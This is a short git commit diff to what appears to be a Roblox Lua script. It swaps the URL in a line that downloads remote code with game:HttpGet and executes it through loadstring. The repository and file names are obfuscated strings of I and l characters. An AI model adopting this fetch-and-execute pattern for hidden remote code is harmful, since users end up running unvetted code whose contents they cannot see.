83a7814adcd91e33c5fb3d8a9c91e462421ef7e9
azenbest <melvyncalcoen1@gmail.com>
2025-02-07 19:43:20 +0100

    Update main.lua

--- main.lua
+++ main.lua
@@ -64,7 +64,7 @@ request({
 
 
 local success, allowed = pcall(function()
-	return loadstring(game:HttpGet("https://raw.githubusercontent.com/azenbest/IIIIIIIIIIIIIIIIIIIIIIIIIIIIII/refs/heads/main/IlIIIIIIIllIllIlllIIl"))()
+	return loadstring(game:HttpGet("https://raw.githubusercontent.com/azenbest/IIIIIIIIIIIIIIIIIIIIIIIIIIIIII/refs/heads/main/IlIIlllIIIIIIIllllIII"))()
 end)
 
 if not success or not allowed then
